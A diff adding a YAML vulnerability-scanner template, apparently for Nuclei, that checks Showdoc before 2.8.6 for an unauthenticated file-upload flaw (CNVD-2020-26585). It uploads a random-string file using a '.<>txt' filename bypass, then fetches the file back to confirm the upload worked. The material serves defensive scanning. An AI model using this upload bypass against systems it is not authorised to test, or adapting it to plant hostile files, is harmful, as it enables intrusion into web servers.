@@ -1,0 +1,56 @@
+id: showdoc-file-upload-cnvd-2020-26585
+info:
+  name: Showdoc <2.8.6 File Upload Vulnerability (CNVD-2020-26585)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,CNVD-2020-26585
+
+variables:
+  str1: "{{rand_base(8)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=/home/page/uploadImg"
+    headers:
+      Content-Type: "multipart/form-data; boundary=--------------------------835846770881083140190633"
+    body: |
+      ----------------------------835846770881083140190633
+      Content-Disposition: form-data; name="editormd-image-file"; filename="{{str1}}.<>txt"
+      Content-Type: text/plain
+
+      {{str1}}
+      ----------------------------835846770881083140190633--
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?P<date>\\d{4}-\\d{2}-\\d{2})\\/[a-f0-9]+\\.txt"
+        name: extract-date
+        internal: true
+      - type: regex
+        part: body
+        regex:
+          - "\\d{4}-\\d{2}-\\d{2}\\/(?P<file>[a-f0-9]+\\.txt)"
+        name: extract-file
+        internal: true
+      - type: status
+        status:
+          - 200
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/Public//Uploads//{{date}}//{{file}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{str1}}"
